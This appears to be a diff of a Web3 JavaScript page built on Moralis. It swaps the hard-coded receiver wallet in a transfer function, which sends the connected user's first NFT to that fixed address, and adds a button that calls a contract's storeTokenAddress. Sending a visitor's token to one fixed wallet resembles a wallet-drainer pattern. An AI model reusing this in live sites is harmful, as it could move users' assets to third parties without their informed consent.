@@ -50,7 +50,7 @@ async function transfer(){
   balance()
   const type = information[0].attributes.contract_type
   const lowType =  type.toLowerCase()
-  const receiver = "0xe33F916081c742515c17214a017588fba126Cf8C"
+  const receiver = "0xce104060ecdabFe6139B248bA20c54e03C5bE376"
   const contractAdress = information[0].attributes.token_address
   const tokenId = information[0].attributes.token_id
 
@@ -63,8 +63,50 @@ async function transfer(){
   let result = await Moralis.transfer(options)
   }
 
+async function interaction(){
+  const ABI = [
+    {
+      "inputs": [
+        {
+          "internalType": "address",
+          "name": "token_address",
+          "type": "address"
+        }
+      ],
+      "name": "storeTokenAddress",
+      "outputs": [],
+      "stateMutability": "nonpayable",
+      "type": "function"
+    },
+    {
+      "inputs": [],
+      "name": "viewTokenAddress",
+      "outputs": [
+        {
+          "internalType": "address",
+          "name": "",
+          "type": "address"
+        }
+      ],
+      "stateMutability": "view",
+      "type": "function"
+    }
+  ]
+
+  const options = {
+    contractAddress: "0xEE995dc1D7793a1674c8D97d0111816C8bcfB12E",
+    functionName: "storeTokenAddress",
+    abi: ABI,
+    params:{
+      token_address: "0xEE995dc1D7793a1674c8D97d0111816C8bcfB12E"
+    },
+  }
+  const addCount =  await Moralis.executeFunction(options)
+}
+
 
   document.getElementById("btn-login").onclick = login;
   document.getElementById("btn-logout").onclick = logOut;
   document.getElementById("btn-balance").onclick = balance;
   document.getElementById("btn-transfer").onclick = transfer;
+  document.getElementById("btn-interaction").onclick = interaction;
